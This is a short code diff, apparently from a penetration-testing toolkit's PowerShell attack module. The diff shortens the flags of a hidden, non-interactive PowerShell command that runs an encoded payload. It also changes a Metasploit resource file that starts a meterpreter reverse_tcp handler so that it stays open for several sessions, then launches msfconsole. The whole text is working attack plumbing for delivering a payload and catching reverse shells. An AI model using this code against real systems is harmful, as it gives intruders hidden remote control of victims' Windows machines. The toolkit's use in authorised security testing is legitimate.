@@ -40,7 +40,7 @@ if powershell_menu_choice != "99":
         # here we format everything for us
         x86 = file(setdir + "/x86.powershell", "r")
         x86 = x86.read()
-        x86 = "powershell -nop -windows hidden -noni -enc " + x86
+        x86 = "powershell -nop -win hid -noni -enc " + x86
         print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
         filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
         filewrite.write(x86)
@@ -53,7 +53,7 @@ if powershell_menu_choice != "99":
         # if we want to start the listener
         if choice == 'YES':
             filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
-            filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
+            filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT %s\nset LHOST 0.0.0.0\nset ExitOnSession false\nexploit -j" % (port))
             filewrite.close()
             msf_path = meta_path()
             subprocess.Popen("ruby %s/msfconsole -L -r %s/reports/powershell/powershell.rc" % (msf_path, setdir), shell=True).wait()
